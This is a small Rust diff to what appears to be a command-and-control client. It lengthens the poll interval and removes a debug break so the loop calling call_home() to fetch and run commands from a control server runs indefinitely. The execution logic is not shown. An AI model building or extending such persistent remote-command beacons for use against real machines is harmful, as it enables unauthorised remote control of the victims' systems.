@@ -14,7 +14,7 @@ use crate::models::{
 mod tasks;
 mod models;
 
-const POLL_SLEEP: time::Duration = time::Duration::from_secs(5);
+const POLL_SLEEP: time::Duration = time::Duration::from_secs(10);
 
 /// Fetches commands from the control server and runs them, then returns task results to control
 /// server
@@ -76,16 +76,9 @@ async fn initialise_client() -> String {
 #[tokio::main]
 async fn main() -> Result<(), anyhow::Error> {
     let token: String = initialise_client().await;
-    let mut gets = 0;
     loop {
         call_home(&token).await;
         thread::sleep(POLL_SLEEP);
-
-        // Remove break when the client is supposed to run forever
-        if gets >= 1 {
-            break;
-        }
-        gets += 1;
     }
     Ok(())
 }
